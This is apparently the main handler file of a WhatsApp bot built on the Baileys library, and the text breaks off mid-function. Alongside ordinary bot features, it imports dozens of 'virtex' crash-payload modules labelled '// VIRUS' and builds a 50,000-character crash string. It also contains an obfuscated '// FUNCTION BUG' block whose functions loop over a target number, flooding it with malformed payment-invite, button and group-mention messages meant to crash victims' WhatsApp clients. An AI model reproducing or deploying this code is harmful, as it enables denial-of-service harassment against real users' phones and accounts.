process.on('uncaughtException', console.error)
require('./lib/zyn-list')
require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const { youtube } = require("btch-downloader")
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const mark = `0@s.whatsapp.net`
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const yts = require("yt-search")
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const moment = require('moment-timezone')

const uploadFile = require("./lib/uploadFile")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { stickQC } = require('./lib/qc-stick')
const { sswebDesktop, sswebTablet, sswebPhone } = require('./lib/ssweb')
const Func = require('./lib/functions')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')
const virtexnyalur = `ZynxzXx99`+"ꦾ".repeat(50000) 
const prem = require("./lib/premium");
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
// VIRUS
const { ngazap } = require("./basezyn/virtex/ngazap")
const { virtex7 } = require("./basezyn/virtex/virtex7")
const { buttonvirus } = require("./basezyn/virtex/buttonvirus")
const { cttl } = require("./basezyn/virtex/cttl")
const { bd } = require("./basezyn/virtex/bd")
const { ft } = require("./basezyn/virtex/ft")
const { place } = require("./basezyn/virtex/place")
const { url } = require("./basezyn/virtex/url")
const { notif1 } = require("./basezyn/virtex/notif1")
const { notif2 } = require("./basezyn/virtex/notif2")
const { notif3 } = require("./basezyn/virtex/notif3")
const { notif4 } = require("./basezyn/virtex/notif4")
const { tizi } = require("./basezyn/virtex/tizi")
const { pen } = require("./basezyn/virtex/pen")
const { mata1 } = require("./basezyn/virtex/mata1")
const { ker } = require("./basezyn/virtex/ker")
const { mata } = require("./basezyn/virtex/mata")
const { weg } = require("./basezyn/virtex/weg")
const { aud } = require("./basezyn/virtex/aud")
const { aud1 } = require("./basezyn/virtex/aud1")
const { pvz3 } = require("./basezyn/virtex/pvz3")
const { pvm3 } = require("./basezyn/virtex/pvm3")
const { funer } = require("./basezyn/virtex/funer")
const { pv3m } = require("./basezyn/virtex/pv3m")
const { lugia } = require("./basezyn/virtex/lugia")
const { malvadinha } = require("./basezyn/virtex/malvadinha")
const { explosion } = require("./basezyn/virtex/explosion")
const { parando } = require("./basezyn/virtex/parando")
const { killed } = require("./basezyn/virtex/killed")
const { cova } = require("./basezyn/virtex/cova")
const { sumiu } = require("./basezyn/virtex/sumiu")
const { destroi } = require("./basezyn/virtex/destroi")
const { voids } = require("./basezyn/virtex/voids")
const { explosionios } = require("./basezyn/virtex/explosionios")
const { buttontzy } = require("./basezyn/virtex/buttontzy")
const { vimg } = require("./basezyn/virtex/vimg")
const { vimgesw } = require("./basezyn/virtex/vimgesw")
const { qpeh } = require("./basezyn/virtex/qpeh")
const { konf } = require("./basezyn/virtex/konf")
const { vnolim } = require("./basezyn/virtex/vnolim")
const { mnth } = require("./basezyn/virtex/mnth")
const { mnth1 } = require("./basezyn/virtex/mnth1")
const { mt1 } = require("./basezyn/virtex/mt1")
const { mt2 } = require("./basezyn/virtex/mt2")
const { mt3 } = require("./basezyn/virtex/mt3")
// BATAS
const thumb = fs.readFileSync ('./zyn/media/image/thumb.jpg')
const vnnye = JSON.parse(fs.readFileSync('./zyn/media/vn.json'))
const docunye = JSON.parse(fs.readFileSync('./zyn/media/docs.json'))
const zipnye = JSON.parse(fs.readFileSync('./zyn/media/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./zyn/media/apk.json'))
const vidnye = JSON.parse(fs.readFileSync('./zyn/media/vid.json'))
const pengguna = JSON.parse(fs.readFileSync('./zyn/database/database.json'))
let premium = JSON.parse(fs.readFileSync('./zyn/database/premium.json'));
const banned = JSON.parse(fs.readFileSync('./zyn/database/banned.json'))

module.exports = zynX = async (zynX, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

const ctext = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var xyz = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  abc.map((v, i) =>
    replacer.push({
      original: v,
      convert: xyz[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await zynX.decodeJid(zynX.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const groupMetadata = m.isGroup ? await zynX.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var stime = ctext(`Good Night`)
 }
 if(time2 < "19:00:00"){
var stime = ctext(`Good Evening`)
 }
 if(time2 < "18:00:00"){
var stime = ctext(`Good Evening`)
 }
 if(time2 < "15:00:00"){
var stime = ctext(`Good Afternoon`)
 }
 if(time2 < "11:00:00"){
var stime = ctext(`Good Morning`)
 }
 if(time2 < "05:00:00"){
var stime = ctext(`Good Morning`)
 }
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
const qtod = m.quoted? "true":"false"
const bii = JSON.parse(fs.readFileSync('./zyn/database/database.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jangan = m.isGroup ? ntilink.includes(m.chat) : false	
// FUNCTION
try {
pplu = await zynX.profilePictureUrl(anu.id, 'image')
} catch {
pplu = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
const zynz = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;zynz,;;;\nFN: Zʏɴxᴢᴏ\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': pplu,
                    thumbnail: pplu,
                    sendEphemeral: true
                }   
            }
        }

const floc = {
			key: {
				participant : '0@s.whatsapp.net',
				...(m.chat ? { 
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				locationMessage: {
					name: `Zʏɴxᴢᴏ ${versions}`,
					thumbnailUrl: pplu
								 }
					 }
			}
// FUNCTION REPLY
const setReply = async (teks) => {
if (db.data.settings[botNumber].replytype == "web1") {
zynX.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], externalAdReply: { showAdAttribution: true, title: "㑒 𝐊𝐢𝐳𝐲𝐲-𝐓𝐳𝐲 ϟ〽️", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "https://youtube.com/@zynxzoo" }}, text: teks }, { quoted: m })
} else if (db.data.settings[botNumber].replytype == "web2") {
zynX.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply: { title: "㑒 𝐊𝐢𝐳𝐲𝐲-𝐓𝐳𝐲 ϟ〽️", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "https://youtube.com/@zynxzoo" }}, text: teks }, { quoted: m })
} else if (db.data.settings[botNumber].replytype == "web3") {
zynX.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 10, isForwarded: true, externalAdReply: { showAdAttribution: true, title: "㑒 𝐊𝐢𝐳𝐲𝐲-𝐓𝐳𝐲 ϟ〽️", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "https://youtube.com/@zynxzoo" }}, text: teks }, { quoted: m })
} else if (db.data.settings[botNumber].replytype == "mess") {
zynX.sendMessage(m.chat, { text: teks, mentions: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [] }, { quoted: m })
} else {
zynX.sendMessage(m.chat, { text: teks, mentions: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [] }, { quoted: m })
}
}


const reply = async(teks) => {zynX.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}

zynX.autoshalat = zynX.autoshalat ? zynX.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zynX.user.id : m.sender
	let id = m.chat 
    if(id in zynX.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
    terbit: '05:42',
    dhuha: '06:02',
    dzuhur: '11:32',
    ashar: '14:53',
    magrib: '17:23',
    isya: '18:38',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat.\n\n*${waktu}*\n_untuk wilayah jepang dan sekitarnya._`
    zynX.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete zynX.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

const totalFitur = () =>{
            var mytext = fs.readFileSync("./main.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

// FUNCTION BUG
const _0x29c806=_0x1cc6;(function(_0x4e925d,_0xf30941){const _0x306e72=_0x1cc6,_0x5e0658=_0x4e925d();while(!![]){try{const _0x3325dc=parseInt(_0x306e72(0x114))/0x1*(-parseInt(_0x306e72(0x158))/0x2)+parseInt(_0x306e72(0x112))/0x3+-parseInt(_0x306e72(0x13f))/0x4*(parseInt(_0x306e72(0x15b))/0x5)+parseInt(_0x306e72(0x10e))/0x6*(parseInt(_0x306e72(0x12d))/0x7)+parseInt(_0x306e72(0x134))/0x8*(-parseInt(_0x306e72(0x154))/0x9)+-parseInt(_0x306e72(0x124))/0xa+parseInt(_0x306e72(0x12e))/0xb*(parseInt(_0x306e72(0x11a))/0xc);if(_0x3325dc===_0xf30941)break;else _0x5e0658['push'](_0x5e0658['shift']());}catch(_0x42492f){_0x5e0658['push'](_0x5e0658['shift']());}}}(_0x3b20,0xa7596));async function sendPaymentInfoMessage(_0x1000ac){const _0x469f7d=_0x1cc6;await zynX[_0x469f7d(0x13e)](_0x1000ac,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x469f7d(0x143),'buttonParamsJson':JSON['stringify']({'currency':_0x469f7d(0x14a),'total_amount':{'value':0x0,'offset':0x64},'reference_id':'4P46GMY57GC','type':_0x469f7d(0x111),'order':{'status':'pending','subtotal':{'value':0x0,'offset':0x64},'order_type':_0x469f7d(0x14b),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x469f7d(0x10a),'pix_static_code':{'merchant_name':_0x469f7d(0x10b),'key':_0x469f7d(0x150),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x1000ac}},{'messageId':null});}async function sendPaymentInfoMessageV2(_0x24e432){const _0x1b1794=_0x1cc6;await zynX['relayMessage'](_0x24e432,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x0,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x1b1794(0x143),'buttonParamsJson':JSON['stringify']({'currency':_0x1b1794(0x14a),'total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x1b1794(0x12b),'type':_0x1b1794(0x111),'order':{'status':_0x1b1794(0x132),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x1b1794(0x14b),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x1b1794(0x10a),'pix_static_code':{'merchant_name':_0x1b1794(0x10b),'key':_0x1b1794(0x150),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x24e432}},{'messageId':null});}async function systemcrashbutton(_0x29dd09){const _0x172bb0=_0x1cc6;var _0x59d2e1=generateWAMessageFromContent(_0x29dd09,proto['Message'][_0x172bb0(0x11b)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':virtexnyalur,'subtitle':'\x20'},'body':{'text':''},'footer':{'text':''},'nativeFlowMessage':{'buttons':[{'name':_0x172bb0(0x115),'buttonParamsJson':'{\x20display_text\x20:\x20\x27ZYNX\x20MODS\x20WHATSAPP\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}'}],'messageParamsJson':_0x172bb0(0x146)}}}}}),{'userJid':_0x29dd09});await zynX[_0x172bb0(0x13e)](_0x29dd09,_0x59d2e1['message'],{'participant':{'jid':_0x29dd09},'messageId':_0x59d2e1[_0x172bb0(0x125)]['id']});}const subscribe_zynXzo={'key':{'fromMe':![],'participant':_0x29c806(0x14c),'remoteJid':_0x29c806(0x13b)},'message':{'listResponseMessage':{'title':_0x29c806(0x120)}}};async function sendGroupMessage(_0x3387bc){const _0x477ef4=_0x29c806;let _0x1e32fc=virtexnyalur,_0x54d570=generateWAMessageFromContent(_0x3387bc,proto[_0x477ef4(0x107)]['fromObject']({'groupMentionedMessage':{'message':{'extendedTextMessage':{'text':_0x477ef4(0x113),'previewType':_0x477ef4(0x156),'contextInfo':{'groupMentions':[{'groupJid':_0x477ef4(0x13d),'groupSubject':_0x1e32fc}]}}}}}),{'userJid':_0x3387bc});await zynX[_0x477ef4(0x13e)](_0x3387bc,_0x54d570[_0x477ef4(0x11c)],{'participant':{'jid':_0x3387bc},'messageId':_0x54d570[_0x477ef4(0x125)]['id']});}async function iphonebyzynX(_0x5a6f74,_0x15c345){const _0x37ad26=_0x29c806;for(let _0x57c131=0x0;_0x57c131<_0x15c345;_0x57c131++){await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{}),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x5a6f74}}),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x5265c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x141dd76000}},{'participant':{'jid':_0x5a6f74}}),await sendPaymentInfoMessage(_0x5a6f74),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{}),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date['now']()+0x6c258c00}},{'participant':{'jid':_0x5a6f74}}),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x5265c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x141dd76000}},{'participant':{'jid':_0x5a6f74}}),await sendPaymentInfoMessage(_0x5a6f74),await sleep(0xbb8),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x5a6f74}}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date['now']()+0x6c258c00}},{}),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x37ad26(0x142)]()+0x5265c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':_0x37ad26(0x141),'expiryTimestamp':Date[_0x37ad26(0x142)]()+0x141dd76000}},{'participant':{'jid':_0x5a6f74}}),await sendPaymentInfoMessage(_0x5a6f74),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date['now']()+0x6c258c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x37ad26(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x5a6f74}}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date['now']()+0x6c258c00}},{}),await zynX[_0x37ad26(0x13e)](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x37ad26(0x142)]()+0x5265c00}},{}),await zynX['relayMessage'](_0x5a6f74,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x37ad26(0x142)]()+0x141dd76000}},{'participant':{'jid':_0x5a6f74}}),await sendPaymentInfoMessage(_0x5a6f74),await sleep(0x1770);}}async function zynXalldvcgais(_0x3540f2,_0x2f0e74){const _0x3d9fd6=_0x29c806;for(let _0x475e4a=0x0;_0x475e4a<_0x2f0e74;_0x475e4a++){await bakdok(_0x3540f2,subscribe_zynXzo),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await systemcrashbutton(_0x3540f2),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x3540f2}}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date['now']()+0x6c258c00}},{}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x5265c00}},{}),await sendPaymentInfoMessage(_0x3540f2),await OneShot(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await systemcrashbutton(_0x3540f2),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date['now']()+0x6c258c00}},{'participant':{'jid':_0x3540f2}}),await zynX['relayMessage'](_0x3540f2,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x5265c00}},{}),await ngeloc(_0x3540f2,subscribe_zynXzo),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await OneShot(_0x3540f2),await systemcrashbutton(_0x3540f2),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x3540f2}}),await zynX['relayMessage'](_0x3540f2,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date['now']()+0x6c258c00}},{}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x5265c00}},{}),await sleep(0xfa0),await sendPaymentInfoMessage(_0x3540f2),await OneShot(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await systemcrashbutton(_0x3540f2),await zynX['relayMessage'](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x3540f2}}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x5265c00}},{}),await sendPaymentInfoMessage(_0x3540f2),await OneShot(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await systemcrashbutton(_0x3540f2),await zynX['relayMessage'](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x3540f2}}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x5265c00}},{}),await ngeloc(_0x3540f2,subscribe_zynXzo),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await OneShot(_0x3540f2),await ngeloc(_0x3540f2,subscribe_zynXzo),await systemcrashbutton(_0x3540f2),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x3540f2}}),await zynX['relayMessage'](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x6c258c00}},{}),await zynX[_0x3d9fd6(0x13e)](_0x3540f2,{'paymentInviteMessage':{'serviceType':_0x3d9fd6(0x141),'expiryTimestamp':Date[_0x3d9fd6(0x142)]()+0x5265c00}},{}),await sendPaymentInfoMessage(_0x3540f2),await sendbugbeta2(_0x3540f2),await sleep(0x1770);}}function _0x1cc6(_0xdc18f6,_0x5c0bb){const _0x3b204a=_0x3b20();return _0x1cc6=function(_0x1cc6d9,_0x2e3d6f){_0x1cc6d9=_0x1cc6d9-0x106;let _0xc16e9e=_0x3b204a[_0x1cc6d9];return _0xc16e9e;},_0x1cc6(_0xdc18f6,_0x5c0bb);}async function zynXzui(_0x26e909,_0x2d06f9){const _0xe633f8=_0x29c806;for(let _0x1b3218=0x0;_0x1b3218<_0x2d06f9;_0x1b3218++){await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await sendGroupMessage(_0x26e909),await zynX[_0xe633f8(0x109)](_0x26e909,{'text':virtexnyalur},{'quoted':subscribe_zynXzo}),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await 